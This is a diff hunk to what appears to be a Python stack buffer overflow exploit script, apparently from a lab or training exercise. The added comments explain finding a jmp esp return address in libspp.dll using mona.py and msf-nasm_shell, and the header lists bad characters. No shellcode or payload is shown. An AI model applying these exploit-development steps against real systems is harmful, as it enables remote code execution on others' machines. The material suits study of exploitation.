@@ -4,7 +4,17 @@
 # BAD CHARS: 0x00,0x0a,0x0d,0x25,0x26,0x2b,0x3d
 #
 # Now find a way to redirect the execution flow to the shellcode located at the memory address the ESP register is pointing to at the time of the crash.
-# One such method is too search for a jmp esp instruction that retains a reliable static address
+# One such method is too search for a jmp esp instruction that retains a reliable static address using mona.py https://github.com/corelan/mona
+#
+# !mona modules  # RESULT: libspp.dll
+# this is to find modules with mem protections turned off indicating a executabl that always loads at the same address
+#
+# msf-nasm_shell # Use this to find op code for jmp esp
+# nasm > jmp esp
+# 00000000  FFE4              jmp esp
+#
+# Use that value to perform a search in mona
+# !mona find -s "\xFF\xE4" -m libspp.dll"
 import socket
 import sys
 
